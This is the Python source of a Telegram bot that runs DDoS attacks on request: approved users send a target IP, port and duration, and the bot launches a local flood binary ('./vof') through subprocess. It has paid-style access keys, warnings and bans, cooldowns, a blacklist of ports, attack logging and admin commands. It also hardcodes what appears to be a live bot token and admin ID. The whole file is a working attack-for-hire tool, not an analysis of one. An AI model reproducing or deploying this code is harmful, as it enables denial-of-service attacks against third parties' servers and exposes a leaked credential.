import telebot
import subprocess
import json
import psutil  # Library for system information like CPU and memory usage
from datetime import datetime, timedelta

# Configuration and Constants
BOT_TOKEN = '7588841509:AAFY-qCrkKBcX5FFz_plh-0T6yw8NmOffJ8'  # Replace with your actual bot token
ADMIN_ID = 6965153309  # Replace with your main admin ID
MAX_ATTACK_TIME = 300  # Maximum allowed attack time in seconds
DEFAULT_THREAT_LEVEL = 50  # Default threat level for all users
ATTACK_LOG_FILE = "attack_log.json"  # Log file to store attack data
USER_DATA_FILE = "user_data.json"  # File to store user-related data
WARNINGS_LIMIT = 3  # Number of warnings before a user is banned
BAN_DURATION = timedelta(days=1)  # Ban duration of 1 day
ATTACK_COOLDOWN = timedelta(minutes=2)  # Cooldown between attacks (2 minutes)
BLACKLISTED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # List of blacklisted ports

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Load user data
try:
    with open(USER_DATA_FILE, "r") as f:
        user_data = json.load(f)
except FileNotFoundError:
    user_data = {"admins": [ADMIN_ID], "users": {}}  # If file doesn't exist, create a new one

# Function to save user data
def save_user_data():
    with open(USER_DATA_FILE, "w") as f:
        json.dump(user_data, f)

# Function to log attacks
def log_attack(user_id, target_ip, port, attack_time, threat_level):
    """Log attack details for later analysis."""
    log_entry = {
        "user_id": user_id,
        "target_ip": target_ip,
        "port": port,
        "attack_time": attack_time,
        "threat_level": threat_level,
        "timestamp": str(datetime.now())
    }
    with open(ATTACK_LOG_FILE, "a") as log_file:
        json.dump(log_entry, log_file)
        log_file.write("\n")

# Check if the user is an admin
def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in user_data['admins']

# Check if the user is a normal user
def is_normal_user(user_id):
    return user_id in user_data['users']

# Function to add a user (Admin Only)
def add_user(user_id, threat_level=DEFAULT_THREAT_LEVEL):
    if str(user_id) not in user_data['users']:
        user_data['users'][str(user_id)] = {
            "key_valid": True, 
            "warnings": 0, 
            "threat_level": threat_level, 
            "last_attack_time": None
        }
        save_user_data()
        bot.send_message(user_id, "You have been added as a user. You can now use the bot.")
        bot.send_message(ADMIN_ID, f"User {user_id} has been added.")
    else:
        bot.send_message(ADMIN_ID, "User already exists.")

# Function to add an admin (Main Admin Only)
def add_admin(admin_id):
    if admin_id not in user_data['admins']:
        user_data['admins'].append(admin_id)
        save_user_data()
        bot.send_message(admin_id, "You have been added as an admin.")
        bot.send_message(ADMIN_ID, f"User {admin_id} has been added as an admin.")
    else:
        bot.send_message(ADMIN_ID, "Admin already exists.")

# Function to revoke the user's key
def revoke_key(user_id):
    if str(user_id) in user_data['users']:
        user_data['users'][str(user_id)]['key_valid'] = False
        save_user_data()

# Function to ban user for 1 day
def ban_user(user_id):
    user_data['users'][str(user_id)]['banned_until'] = (datetime.now() + BAN_DURATION).strftime("%Y-%m-%d %H:%M:%S")
    user_data['users'][str(user_id)]['warnings'] = 0  # Reset warnings after ban
    save_user_data()
    bot.send_message(user_id, "You have been banned for 24 hours due to breaking the rules.")
    bot.send_message(ADMIN_ID, f"User {user_id} has been banned for 24 hours.")

# Function to warn user and track warnings
def warn_user(user_id, reason):
    user = user_data['users'].get(str(user_id), None)
    if user:
        user['warnings'] = user.get('warnings', 0) + 1
        save_user_data()
        bot.send_message(user_id, f"Warning: {reason}. You have {WARNINGS_LIMIT - user['warnings']} warnings left.")
        bot.send_message(ADMIN_ID, f"User {user_id} has been warned. Reason: {reason}. Total Warnings: {user['warnings']}")
        if user['warnings'] >= WARNINGS_LIMIT:
            ban_user(user_id)

# Check if the user has a valid key, is not banned, and respects cooldowns
def check_key(user_id):
    user = user_data['users'].get(str(user_id), None)
    if user and user['key_valid']:
        # Check if user is banned
        if 'banned_until' in user:
            if datetime.now() < datetime.strptime(user['banned_until'], "%Y-%m-%d %H:%M:%S"):
                return False  # User is banned
            else:
                del user['banned_until']  # Remove the ban after expiration
                save_user_data()

        # Check attack cooldown
        if user['last_attack_time']:
            time_since_last_attack = datetime.now() - datetime.strptime(user['last_attack_time'], "%Y-%m-%d %H:%M:%S")
            if time_since_last_attack < ATTACK_COOLDOWN:
                warn_user(user_id, "You must wait 2 minutes between attacks")
                return False
        return True
    return False

# Function to execute the DDoS attack using the binary file
def execute_attack(user_id, target_ip, port, duration, threat_level):
    if duration > MAX_ATTACK_TIME:
        warn_user(user_id, f"Attempted attack duration of {duration} seconds exceeds the maximum limit of {MAX_ATTACK_TIME} seconds.")
        return
    if not check_key(user_id):
        bot.send_message(user_id, "Invalid or expired key, or you are banned. Please contact the admin.")
        return

    if port in BLACKLISTED_PORTS:
        bot.send_message(user_id, f"Attack on port {port} is forbidden (blacklisted).")
        warn_user(user_id, f"Attempted attack on blacklisted port {port}")
        return

    # Log the attack
    log_attack(user_id, target_ip, port, duration, threat_level)
    
    # Save last attack time
    user_data['users'][str(user_id)]['last_attack_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_user_data()

    # Construct the command to run the attack
    command = f'./vof {target_ip} {port} {duration} {threat_level} 50'
    bot.send_message(user_id, f"Launching attack on {target_ip}:{port} for {duration}s with threat level {threat_level}.")
    subprocess.Popen(command.split())  # Start the attack

# Command for admin to add a normal user
@bot.message_handler(commands=['add_user'])
def handle_add_user(message):
    if is_admin(message.from_user.id):
        try:
            user_id = int(message.text.split()[1])
            add_user(user_id)
        except (IndexError, ValueError):
            bot.send_message(ADMIN_ID, "Usage: /add_user <user_id>")
    else:
        bot.send_message(message.from_user.id, "You do not have permission to add users.")

# Command for the main admin to add another admin
@bot.message_handler(commands=['add_admin'])
def handle_add_admin(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_admin_id = int(message.text.split()[1])
            add_admin(new_admin_id)
        except (IndexError, ValueError):
            bot.send_message(ADMIN_ID, "Usage: /add_admin <user_id>")
    else:
        bot.send_message(message.from_user.id, "You do not have permission to add admins.")

# Command for admin to view the attack history of all users
@bot.message_handler(commands=['view_logs'])
def handle_view_logs(message):
    if is_admin(message.from_user.id):
        try:
            with open(ATTACK_LOG_FILE, "r") as log_file:
                logs = log_file.readlines()
                bot.send_message(ADMIN_ID, "Attack History:")
                for log_entry in logs:
                    bot.send_message(ADMIN_ID, log_entry)
        except FileNotFoundError:
            bot.send_message(ADMIN_ID, "No logs found.")
    else:
        bot.send_message(message.from_user.id, "You do not have permission to view logs.")

# Command to check VPS health (CPU and memory usage) - Admin Only
@bot.message_handler(commands=['vps_status'])
def handle_vps_status(message):
    if is_admin(message.from_user.id):
        # Get CPU and memory usage
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        memory_usage = memory_info.percent
        
        status_message = (f"VPS Health:\n"
                          f"CPU Usage: {cpu_usage}%\n"
                          f"Memory Usage: {memory_usage}%")
        bot.send_message(ADMIN_ID, status_message)
    else:
        bot.send_message(message.from_user.id, "You do not have permission to view VPS status.")

# Command to launch an attack (Only for approved users)
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    if not check_key(user_id):
        return

    try:
        args = message.text.split()
        target_ip = args[1]
        port = int(args[2])
        attack_time = int(args[3])
        threat_level = DEFAULT_THREAT_LEVEL

        if is_admin(user_id):
            threat_level = int(args[4]) if len(args) > 4 else DEFAULT_THREAT_LEVEL

        execute_attack(user_id, target_ip, port, attack_time, threat_level)
    except (IndexError, ValueError):
        bot.send_message(user_id, "Usage: /attack <ip> <port> <time>")

# Polling to listen for messages
bot.polling(none_stop=True)
